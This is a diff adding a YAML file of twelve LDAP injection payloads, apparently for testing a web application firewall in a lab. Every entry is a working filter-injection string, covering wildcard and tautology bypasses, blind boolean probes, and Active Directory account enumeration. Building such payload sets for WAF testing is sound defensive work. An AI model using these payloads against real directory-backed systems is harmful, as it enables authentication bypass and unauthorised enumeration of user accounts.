@@ -1,0 +1,86 @@
+# LDAP injection — 12 entries. WAF-view only (no LDAP sink in the lab apps).
+# Sources: PayloadsAllTheThings / LDAP Injection, PortSwigger, InstaTunnel blog.
+
+- id: ldap-wildcard
+  class: ldap
+  payload: "*"
+  trigger: &T200 { kind: status, code: 200 }
+  cwe: CWE-90
+  source: "Wildcard — returns all entries"
+
+- id: ldap-or-wildcard
+  class: ldap
+  payload: "*)(uid=*))(|(uid=*"
+  trigger: *T200
+  cwe: CWE-90
+  source: "PayloadsAllTheThings — OR injection"
+
+- id: ldap-admin-comment
+  class: ldap
+  payload: "admin)(cn=*))"
+  trigger: *T200
+  cwe: CWE-90
+  source: "PayloadsAllTheThings — comment injection"
+
+- id: ldap-and-tautology
+  class: ldap
+  payload: "*)(uid=*))(&(uid=*"
+  trigger: *T200
+  cwe: CWE-90
+  source: "PayloadsAllTheThings — AND tautology"
+
+- id: ldap-password-null
+  class: ldap
+  payload: "*)(&(objectClass=user)(userPassword=*"
+  trigger: *T200
+  cwe: CWE-90
+  source: "LDAP filter smuggling"
+
+- id: ldap-name-sink
+  class: ldap
+  payload: "admin*"
+  trigger: *T200
+  cwe: CWE-90
+  source: "Prefix wildcard — directory enum"
+
+- id: ldap-blind-truth
+  class: ldap
+  payload: "admin)(&(1=1))"
+  trigger: *T200
+  cwe: CWE-90
+  source: "Blind boolean — always true"
+
+- id: ldap-blind-falsify
+  class: ldap
+  payload: "admin)(!(&(1=1))"
+  trigger: *T200
+  cwe: CWE-90
+  source: "Blind boolean — negation"
+
+- id: ldap-samaccount
+  class: ldap
+  payload: "*)(sAMAccountName=*"
+  trigger: *T200
+  cwe: CWE-90
+  source: "Active Directory — sAMAccountName enum"
+
+- id: ldap-useraccountcontrol
+  class: ldap
+  payload: "*)(userAccountControl:1.2.840.113556.1.4.803:=2"
+  trigger: *T200
+  cwe: CWE-90
+  source: "AD — matching rule OID, disabled accounts"
+
+- id: ldap-double-paren
+  class: ldap
+  payload: "))(|(uid=*"
+  trigger: *T200
+  cwe: CWE-90
+  source: "Filter escape with nested close"
+
+- id: ldap-dn-injection
+  class: ldap
+  payload: "admin,ou=users,dc=test,dc=com"
+  trigger: *T200
+  cwe: CWE-90
+  source: "DN injection — parser boundary confusion"
